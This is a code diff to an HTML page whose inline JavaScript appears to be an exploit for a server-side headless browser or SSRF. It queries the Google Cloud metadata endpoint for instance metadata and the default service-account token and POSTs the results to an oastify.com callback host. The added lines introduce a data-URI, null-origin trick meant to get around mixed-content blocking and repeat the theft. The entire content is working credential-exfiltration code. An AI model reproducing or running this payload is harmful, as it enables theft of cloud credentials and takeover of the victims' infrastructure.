@@ -6,14 +6,13 @@ var c = 'h6okw84ags44xavlf0mfn3vlzc59tftujld65v.oastify.com';
 fetch('https://'+c+'/https-loaded', {mode:'no-cors'});
 
 // Mixed-content probe: HTTP fetch from HTTPS page
-// Works ONLY if Chrome runs with --allow-running-insecure-content or page is HTTP
 fetch('http://'+c+'/http-probe', {mode:'no-cors'})
   .then(function(){fetch('https://'+c+'/http-allowed', {mode:'no-cors'});})
   .catch(function(e){
     fetch('https://'+c+'/http-blocked?e='+encodeURIComponent(e.message||'err'), {mode:'no-cors'});
   });
 
-// If mixed content is allowed, also attempt IMDS
+// If mixed content is allowed, attempt IMDS
 fetch('http://169.254.169.254/computeMetadata/v1/?recursive=true', {headers:{'Metadata-Flavor':'Google'}})
   .then(function(r){return r.text();})
   .then(function(d){return fetch('https://'+c+'/gcp', {method:'POST', body:d, mode:'no-cors'});})
@@ -23,5 +22,14 @@ fetch('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/defau
   .then(function(r){return r.text();})
   .then(function(d){return fetch('https://'+c+'/token', {method:'POST', body:d, mode:'no-cors'});})
   .catch(function(){});
+
+// Data URI redirect bypass: navigate to null-origin context which may allow HTTP fetches
+// Encode payload as base64 data URI
+var imdsPayload = '<html><body><script>var c="'+c+'";fetch("https://"+c+"/data-uri-loaded",{mode:"no-cors"});fetch("http://169.254.169.254/computeMetadata/v1/?recursive=true",{headers:{"Metadata-Flavor":"Google"}}).then(function(r){return r.text()}).then(function(d){return fetch("https://"+c+"/gcp-data",{method:"POST",body:d,mode:"no-cors"})}).catch(function(e){fetch("https://"+c+"/gcp-fail?e="+encodeURIComponent(e.message),{mode:"no-cors"})});<\/script></body></html>';
+try {
+  window.open('data:text/html;charset=utf-8,'+encodeURIComponent(imdsPayload), '_blank');
+} catch(e) {
+  fetch('https://'+c+'/data-uri-fail?e='+encodeURIComponent(e.message||'err'), {mode:'no-cors'});
+}
 </script>
 </body></html>
